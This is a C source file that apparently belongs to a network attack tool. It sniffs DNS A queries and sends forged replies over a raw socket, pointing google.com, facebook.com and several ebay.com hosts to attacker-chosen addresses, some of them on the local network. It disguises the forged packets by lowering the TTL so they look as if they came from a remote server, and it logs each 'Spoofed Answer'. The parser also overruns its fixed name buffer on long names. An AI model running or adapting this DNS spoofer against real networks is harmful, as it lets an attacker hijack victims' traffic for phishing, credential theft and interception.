#include <ting/dns.h>

static const ting_dns_host ting_dns_hosts[] = {
        (ting_dns_host){.host="google.com", .addr=TING_OCTETS(1, 3, 3, 7)},
        (ting_dns_host){.host="facebook.com", .addr=TING_OCTETS(69, 4, 20, 69)},
        (ting_dns_host){.host="ebay.com", .addr=TING_OCTETS(192, 168, 0, 17)},
        (ting_dns_host){.host="www.ebay.com", .addr=TING_OCTETS(192, 168, 0, 17)},
        (ting_dns_host){.host="rover.ebay.com", .addr=TING_OCTETS(192, 168, 0, 17)},
        (ting_dns_host){.host="svcs.ebay.com", .addr=TING_OCTETS(192, 168, 0, 17)},
};
static const size_t ting_dns_hosts_count = sizeof(ting_dns_hosts)/sizeof(ting_dns_host);

bool ting_feature_dns_init(void)
{
    debugf("%s\n", "Starting DNS feature");
    memset((void*)ting_buf_dns, 0, sizeof(ting_buf_dns));
    return true;
}

void ting_feature_dns_process(char *buffer, uint16_t size)
{
    char ting_dns_name[256];
    size_t response_size, response_offset;
    int client_sock = -1;
    struct sockaddr_in client_sin;
    unsigned char cnt, *dns_iter;
    const unsigned char *end = (unsigned char*)buffer + size;
    size_t name_size, i;

    // ethernet header
    ting_hdr_eth *eth;
    ting_hdr_ip *ip, *ip_res;
    ting_hdr_udp *udp, *udp_res;
    ting_hdr_dns *dns, *dns_res;

    // check if the incoming frame is too large to handle.
    if(size > TING_DNS_MAX_SIZE + sizeof(ting_hdr_eth))
    {
        return;
    }

    // check if the frame is an ethernet frame contains an IP packet.
    eth = (ting_hdr_eth*)buffer;
    if(eth->h_proto != ting_be16(ETH_P_IP))
    {
        return;
    }

    // check if the incoming packet is UDP.
    ip = (ting_hdr_ip*)(buffer + sizeof(ting_hdr_eth));
    if(ip->protocol != IPPROTO_UDP)
    {
        return;
    }

    // check if the incoming UDP datagram is destined for port 53.
    udp = (ting_hdr_udp*)(buffer + sizeof(ting_hdr_eth) + (ip->ihl * sizeof(uint32_t)));
    if(udp->dest != ting_be16(53))
    {
        return;
    }

    dns = (ting_hdr_dns*)((char*)udp + sizeof(ting_hdr_udp));

    if(dns->response != TING_DNS_RESPONSE_QUERY)
    {
        return;
    }

    // don't bother with multi-question DNS packets... I'm not reading RFC's for this shit.
    if(dns->question_count != ting_be16(1) || dns->answer_count != 0)
    {
        return;
    }

    dns_iter = (unsigned char*)dns + sizeof(ting_hdr_dns);
    name_size = 0;

    while((cnt = *dns_iter++) != 0)
    {
        for(i = 0; i < cnt && dns_iter != end; ++i)
        {
            ting_dns_name[name_size++] = *dns_iter++;
        }
        ting_dns_name[name_size++] = '.';
    }
    ting_dns_name[name_size - 1] = '\0';

    if(dns_iter == end || dns_iter+1 == end)
    {
        return;
    }

    uint16_t dns_type = ting_be16(*((uint16_t*)dns_iter));

    // Only handling DNS A records
    switch(dns_type)
    {
        case TING_DNS_TYPE_A:
            break;
        default:
            return;
    }

    dns_iter += sizeof(uint16_t);

    uint16_t dns_class = ting_be16(*((uint16_t*)dns_iter));
    switch(dns_class)
    {
        case TING_DNS_CLASS_IN:
            break;
        default:
            return;
    }
    for(i = 0; i < ting_dns_hosts_count; ++i)
    {
        if(strncmp(ting_dns_name, ting_dns_hosts[i].host, name_size) == 0)
        {
	    goto has_record;
        }
    }

    debugf("Forwarding DNS A record for %s\n", ting_dns_name);
    return;

has_record:

    /* Set up IP header */
    ip_res              = (ting_hdr_ip*)ting_buf_dns;
    ip_res->id		= 0x5546; //ting_be16(ting_be16(ip->id)+1);
    ip_res->frag_off    = ting_be16(0x4000); // no fragmenting
    ip_res->protocol    = IPPROTO_UDP;
    ip_res->ihl         = 5;  // no additional options
    ip_res->version     = ip->version;
    ip_res->ttl         = 49; // decreased this value from 64 to make it look like it came from a remote server.
    ip_res->check       = 0;
    ip_res->saddr       = ip->daddr;
    ip_res->daddr       = ip->saddr;


    /* Set up UDP header */
    udp_res             = (ting_hdr_udp*)(ting_buf_dns + (ip_res->ihl * 4));
    udp_res->check      = 0;
    udp_res->source     = udp->dest;
    udp_res->dest       = udp->source;

    /* Set up DNS header */
    dns_res                         = (ting_hdr_dns*)((char*)udp_res + sizeof(ting_hdr_udp));
    dns_res->id                     = dns->id;
    dns_res->recursion_desired      = dns->recursion_desired;
    dns_res->truncated              = false;
    dns_res->authoritative_answer   = false;
    dns_res->opcode                 = 0;
    dns_res->response               = TING_DNS_RESPONSE_ANSWER; // create an answer packet
    dns_res->response_code          = 0;
    dns_res->checking_disabled      = 0; //dns->checking_disabled; // TODO: determine best option for this
    dns_res->authentic_data         = false;
    dns_res->unused                 = 0;
    dns_res->recursion_available    = true;
    dns_res->question_count         = ting_be16(1);
    dns_res->answer_count           = ting_be16(1);
    dns_res->authority_count        = ting_be16(0);
    dns_res->resource_count         = ting_be16(0);

    // pointer to the first name
    response_offset = sizeof(ting_hdr_dns);
    response_size = sizeof(ting_hdr_dns);

    dns_iter = (unsigned char*)dns_res;
    dns_iter += response_size;
    memcpy(dns_iter, (char*)dns + sizeof(ting_hdr_dns), name_size);
    dns_iter += name_size;
    *dns_iter++ = 0;

    response_size += name_size;
    ++response_size;

    *((uint16_t*)dns_iter) = ting_be16(TING_DNS_TYPE_A);
    dns_iter += sizeof(uint16_t);

    *((uint16_t*)dns_iter) = ting_be16(TING_DNS_CLASS_IN);
    dns_iter += sizeof(uint16_t);

    *((uint16_t*)dns_iter) = ting_be16((uint16_t)((0b11 << 14) | response_offset));
    dns_iter += sizeof(uint16_t);

    *((uint16_t*)dns_iter) = ting_be16(TING_DNS_TYPE_A);
    dns_iter += sizeof(uint16_t);

    *((uint16_t*)dns_iter) = ting_be16(TING_DNS_CLASS_IN);
    dns_iter += sizeof(uint16_t);

    *((uint32_t*)dns_iter) = ting_be32(123);
    dns_iter += sizeof(uint32_t);

    *((uint16_t*)dns_iter) = ting_be16(sizeof(ting_dns_hosts[i].addr));
    dns_iter += sizeof(uint16_t);

    *((uint32_t*)dns_iter) = ting_dns_hosts[i].addr;
    dns_iter += sizeof(uint32_t);

    response_size += 20;
    response_size += sizeof(ting_hdr_udp);

    udp_res->len = ting_be16(response_size);

    if((client_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    {
        debugf("%s\n", "socket error.");
    }

    ip_res->tot_len = ting_be16((ip_res->ihl * 4) + sizeof(ting_hdr_udp) + response_size);

    client_sin.sin_family = AF_INET;
    client_sin.sin_port = udp->source;
    client_sin.sin_addr.s_addr = ip->saddr;

    memset(&client_sin.sin_zero, 0, sizeof(client_sin.sin_zero));
    //print_udp_packet((unsigned char*)ip);
    //print_udp_packet((unsigned char*)ting_buf_dns);

    if(sendto(client_sock, ting_buf_dns, ting_be16(ip_res->tot_len), 0, (struct sockaddr*)&client_sin, sizeof(client_sin)) < 0)
    {
        debugf("%s\n", "sendto error.");
	perror("socket");
    }
    else
    {
        debugf("Spoofed Answer for  DNS A record for %s\n", ting_dns_name);
    }

    close(client_sock);
}

